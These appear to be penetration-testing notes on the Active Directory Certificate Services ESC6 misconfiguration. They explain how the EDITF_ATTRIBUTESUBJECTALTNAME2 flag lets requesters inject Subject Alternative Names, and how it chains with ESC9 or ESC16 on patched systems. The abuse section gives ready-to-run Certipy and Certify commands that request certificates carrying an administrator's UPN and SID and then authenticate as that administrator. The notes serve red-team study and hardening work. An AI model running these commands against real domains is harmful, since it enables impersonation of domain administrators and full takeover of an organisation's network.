## Overview

> [!summary]
> Microsoft in modern systems use 2 things to validate the certificate, it use UPN + SID. The CA will appned SID to UPN of the attacker account. So even if the attacker can control UPN to put it as UPN of administrator, he can't control the process of appending the SID. So thats why ESC6 alone isn't enough. We need `ESC9/ESC16`  that disable SID extension.

There is configuration in CA `EDITF_ATTRIBUTESUBJECTALTNAME2` which make the CA trust the `SAN` "SubjectAltName" which make all templates  vulnerable to `ESC1`. Because we supply the `SAN`.

ESC6 focuses on a CA configuration setting: the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag. When this flag is enabled on an Enterprise CA (typically via its policy module registry settings), it permits certificate requesters to include Subject Alternative Names (SANs) in their certificate requests by specifying a special request attribute (`san:<type>=<value>`, e.g., `san:upn=administrator@corp.local&sid=S-1-X-...`). This is highly significant because the CA will honor these SANs and embed them into the issued certificate, even if the certificate template used for the request does _not_ have the "Enrollee supplies subject" (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) flag set.

Essentially, `EDITF_ATTRIBUTESUBJECTALTNAME2` acts as a CA-wide override, allowing requesters to inject SANs into certificates issued from _any_ template published by that CA, potentially bypassing template-level restrictions on subject specification. Administrators might enable this flag for operational convenience, such as allowing specific applications to request certificates with predefined DNS names or UPNs for web server certificates without modifying each template. However, it's a dangerous setting as it can implicitly make many templates vulnerable to SAN-based impersonation attacks if not meticulously managed with other controls.

In modern, patched Active Directory environments - specifically, those with CAs and DCs that have received the May 2022 security updates addressing Certifried/CVE-2022-26923 and later - ESC6 _alone_ is generally not sufficient for privilege escalation if certificates include the `szOID_NTDS_CA_SECURITY_EXT` (SID security extension). This is because the KDC prioritizes the SID from this security extension for mapping the certificate to an account during Kerberos PKINIT authentication. If an attacker uses ESC6 to inject a UPN for `Administrator` and a SID for `Administrator` into the SAN of a certificate, but the certificate is legitimately issued for the attacker's own account (and thus the SID security extension contains the attacker's SID), the KDC will use the attacker's SID, preventing impersonation.

However, ESC6 becomes a potent component of an attack chain when combined with:

- **ESC9 (No Security Extension on Template):** A certificate template is configured _not_ to include the SID security extension.
- **ESC16 (Security Extension Disabled on CA):** The CA itself is configured _not_ to include the SID security extension in _any_ issued certificates.

In these combined scenarios (ESC6 + ESC9, or ESC6 + ESC16), the SID security extension is absent from the issued certificate. This forces the KDC (even in "Full Enforcement" mode for strong certificate binding, which is `StrongCertificateBindingEnforcement=2`) to fall back to other mapping methods. One such fallback allows the KDC to use a SID provided in the SAN if it's formatted as a specific URL: `URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`. ESC6 provides the means for the attacker to inject this maliciously crafted SAN SID, thereby enabling impersonation even on fully patched DCs.

---
## Enumeration
### Linux
```
Certificate Authorities
  0
    CA Name                             : CORP-CA
    DNS Name                            : CA.CORP.LOCAL
    ...
    User Specified SAN                  : Enabled
    Request Disposition                 : Issue
    ...
```

### Windows
```powershell
[*] Enterprise/Enrollment CAs:

    Enterprise CA Name            : lab-LAB-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=lab-LAB-DC-CA, DC=lab, DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
```


---
## Abuse
If we are dealing with `old system` that didn't get updates specially for certifried then you can abuse `ESC6` as same as `ESC1`, but if it got updates then `ESC6` alone isn't enough.
### Newer systems
We should combine `ESC6` with `ESC9`**(Template disables SID extension)** or`ESC16`**(CA disables SID extension)** to disable SID interaction.
So we should request a certificate with **malicious SAN (UPN and SID URL)**. For example. By laveraging `ESC6` to tamper `UPN`and `ESC9` to request certificate that don't have SID extension.

***What Flags should be used***:
- `-template 'ESC9'`: Specifies a template vulnerable to `ESC9` (i.e., one that is configured with `CT_FLAG_NO_SECURITY_EXTENSION`). If exploiting an `ESC16` scenario (where the CA globally disables the SID extension), _any_ enrollable template on that CA which permits client authentication can be used here, as the CA will strip the SID extension regardless of the template's settings.
- `-sid S-1-5-21-...-500`: Certipy takes this SID and, when ESC6 is active and the SID security extension is known to be omitted, will format it as the required SAN URL (`URL=tag:microsoft.com,2022-09-14:sid:<VALUE>`) and include it as a request attribute. This should be the SID of the target account (e.g., a Domain Administrator).
- `-upn administrator@corp.local`: Specifies the UPN of the target account to also be included in the SAN.
#### Linux
```sh
# 1. Request ESC9 certificate or in ESC16 any certificate works, and tamper with the UPN and SID (Replace ESC9 with an actual template name that has no security extension, or any client auth template if the CA is ESC16-vulnerable)
certipy req -u $USER -p $PASSWORD -ca $CA -dc-ip $IP -template 'ESC9' -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'

# 2. authenticate
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```
#### Windows
```powershell

```

---
### Older systems
It will work directly because older systems rely on UPN only and you can tamper it, so you can privEsc directly:
**Request certificate using ESC6 to inject SAN SID, but on a standard template (e.g., `User`) that includes the SID Security Extension.**

#### Linux
```sh
# Certipy correctly warns about the conflicting SIDs. The CA included the attacker-supplied SAN UPN and SAN SID (due to ESC6), but it _also_ correctly included the attacker's actual SID (`S-1-5-21-...-1106`) in the `szOID_NTDS_CA_SECURITY_EXT`. Certipy indicates that this security extension SID will be prioritized by Windows.

# 1. Request a certificate while changing the UPN.
certipy req -u $USER -p $PASSWORD -ca $CA -dc-ip $IP -template User -upn Administrator@lab.local

# 2. Authenticate.
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

#### Windows
```powershell
.\Certify.exe request /template:User /ca:CA /altname:administrator
```